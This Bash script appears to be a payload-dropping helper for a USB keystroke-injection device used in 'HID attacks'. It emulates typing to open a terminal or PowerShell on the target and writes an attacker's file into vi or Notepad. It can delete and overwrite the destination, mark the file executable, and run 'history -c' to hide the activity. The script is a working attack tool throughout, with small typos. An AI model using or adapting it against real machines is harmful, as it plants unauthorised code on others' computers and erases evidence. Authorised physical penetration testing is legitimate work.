#!/bin/bash
#
# DROP v1 by bg-wa
# Simplifies dropping files from HID attacks for LINUX
# Usage: DROP [OS] bb_source_file.txt attack_destination_file.txt [overwrite: false] [executable: false]
#
# Example:
# DROP UNITY /root/udisk/payloads/$SWITCH_POSITION/source.sh ~/target_destination.sh true true
source ./run.sh

function DROP() {
    os=$1
    source=$2
    destination=$3
    overwrite=$4
    executable=$5

    case "$os" in
      WIN)
             RUN WIN powershell
         ;;
      OSX)
             RUN OSX terminal
         ;;
      UNITY)
             RUN UNITY terminal
         ;;
      LINUX)
             RUN LINUX terminal
         ;;
      *)
             RUN UNITY terminal
         ;;
   esac

    QUACK DELAY 1000

    if "$overwrite" == "true"
    then
        case "$os" in
          WIN)
                 QUACK STRING del "$destination"
             ;;
          *)
                 QUACK STRING rm "$destination"
             ;;
        esac
        QUACK ENTER
        QUACK DELAY 500
    fi

    case "$os" in
      WIN)
            QUACK STRING fsutil file createnew "$destination"
            QUACK ENTER
            QUACK DELAY 500
            QUACK STRING notepad.exe "$destination"
            QUACK ENTER
            QUACK DELAY 1000
         ;;
      *)
            QUACK STRING vi "$destination"
            QUACK ENTER
            QUACK DELAY 500
            QUACK STRING i
         ;;
    esac

    while IFS= read -r data
    do
        QUACK STRING "$data"
        QUACK ENTER
    done < "$source"

    QUACK DELAY 500

    case "$os" in
      WIN)
             QUACK CTRL s
             QUACK CRTL x
         ;;
      *)
            QUACK ESC
            QUACK ENTER
            QUACK STRING :wq
            QUACK ENTER

            if "$executable" == "true"
            then
                 QUACK STRING chmod +x "$destination"
                QUACK ENTER
                QUACK DELAY 500
            fi

            QUACK STRING history -c
            QUACK ENTER
            QUACK STRING exit
            QUACK ENTER
         ;;
    esac
}

export -f DROP
